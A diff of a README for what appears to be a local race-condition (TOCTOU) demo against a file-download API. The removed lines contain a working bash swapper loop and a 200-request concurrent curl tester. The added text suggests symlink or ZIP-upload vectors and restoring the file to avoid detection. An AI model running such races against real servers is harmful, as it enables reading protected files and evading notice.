@@ -1,111 +1,45 @@
-## 1) Create the storage and test files 
+# Race Condtion on file download functionality
 
-```bash
-STORAGE="/tmp/secure-downloads-demo"
-rm -rf "$STORAGE"                # remove any broken state from previous attempts
-mkdir -p "$STORAGE"
-# create safe / attack files and the deployed file
-echo "NORMAL_CONTENT" > "$STORAGE/target-real"
-echo "ATTACKER_CONTENT" > "$STORAGE/target-attack"
-cp "$STORAGE/target-real" "$STORAGE/target.txt"
-# show them
-ls -la "$STORAGE"
-```
 
-You should see `target-real`, `target-attack` and `target.txt` listed.
+Because the check that validates the file path and the actual file open/download 
+aren’t done atomically, an attacker can change what the server opens by replacing
+the directory entry that the server will later use (due to other vulnerabilities),
+and the server may end up returning the top-secret file.
 
----
+In this demo we swap the content by replacing the deployed pathname:
+the attacker briefly places a symlink (or an atomically renamed hardlink) at `target.txt` 
+that points to the protected secret, then restores the real file. That causes new `open(path)` 
+calls to see the attacker-controlled inode during the vulnerable window.
 
-## 2) Robust swapper script that *recreates* missing attack file automatically
+In real-world scenarios this can happen in different ways. For example, an attacker 
+might craft a ZIP upload that creates symlinks or performs path traversal.
 
-This swapper will atomically replace `target.txt` with attacker content (via `mv`), and if `target-attack` is ever missing it will recreate it so `mv` never fails.
 
-Save and run it:
-
-```bash
-cat > /tmp/swap_contents.sh <<'BASH'
-#!/usr/bin/env bash
-set -euo pipefail
-
-STORAGE="/tmp/secure-downloads-demo"
-TARGET="$STORAGE/target.txt"
-REAL="$STORAGE/target-real"
-ATTACK="$STORAGE/target-attack"
-TMP_ATTACK="$STORAGE/._attack_tmp"
-
-# ensure attack file exists at start
-if [ ! -f "$ATTACK" ]; then
-  echo "ATTACKER_CONTENT" > "$ATTACK"
-fi
-
-while true; do
-  # ensure attacker file exists (recreate if needed)
-  if [ ! -f "$ATTACK" ]; then
-    echo "recreating missing attack file"
-    echo "ATTACKER_CONTENT" > "$ATTACK"
-  fi
-
-  # atomically move attack into place (mv across same FS is atomic)
-  mv -f "$ATTACK" "$TARGET"
-
-  # small window
-  sleep 0.02
-
-  # restore normal content (atomic replace)
-  cp -f "$REAL" "$TARGET"
-
-  # tiny pause to yield CPU
-  sleep 0.02
-done
-BASH
-
-chmod +x /tmp/swap_contents.sh
-```
-
-Start it in the background (and capture logs):
-
-```bash
-nohup bash /tmp/swap_contents.sh > /tmp/swapper.log 2>&1 &
-echo "swapper started, PID: $!"
-sleep 0.2
-tail -n 20 /tmp/swapper.log || true
-```
+## 1) Create the storage and test files using the test/create_files.sh script
 
 ---
-
-## 3) Verify the storage contents while swapper runs
-
-(You should see `target.txt` toggling between contents if you `cat` repeatedly.)
+## 2) Check if you can use the api to download a file
 
 ```bash
-# show file metadata and a quick peek
-ls -la /tmp/secure-downloads-demo
-head -n 5 /tmp/secure-downloads-demo/target.txt || true
+curl -v http://localhost:5007/api/files/download/target.txt -o test/output/target.txt
 ```
+
+
+
+## 2) Run the swapper script using the test/swap_contents.sh script
+
+Changing it once can be enough if the privileged reader 
+opens the path at that exact moment, 
+but in practice you usually want the attacker to flip the name multiple times 
+so the race actually hits and then restore the real file to avoid easy detection 
+or breaking normal operation.
 
 ---
+## 3) Run the curl a few times
 
-## 4) Run the concurrent download tester (increase attempts if needed)
+Sometimes it will show you the original text and sometime the content the attacker wanted to steal.
 
-Run this in another terminal (or same — it's fine). It fires many concurrent requests and then searches results for `ATTACKER_CONTENT`.
-
-```bash
-# spawn many concurrent downloads
-for i in $(seq 1 200); do
-  curl -s "http://localhost:5007/api/files/download/target.txt" -o "/tmp/result_$i.txt" &
-done
-wait
-
-# check if any response contained the attacker content
-if grep -q "ATTACKER_CONTENT" /tmp/result_*.txt 2>/dev/null; then
-  echo "=== RACE REPRODUCED: attack content observed in at least one response ==="
-  grep -H "ATTACKER_CONTENT" /tmp/result_*.txt | sed -n '1,20p'
-else
-  echo "No attacker content found. Try increasing concurrency or the controller delay (demo-only)."
-fi
-```
-
-If you see `RACE REPRODUCED`, the vulnerable controller sometimes served the swapped-in attacker content.
+curl -sS -D - "http://localhost:5007/api/files/download/target.txt" -o -
 
 ---
 
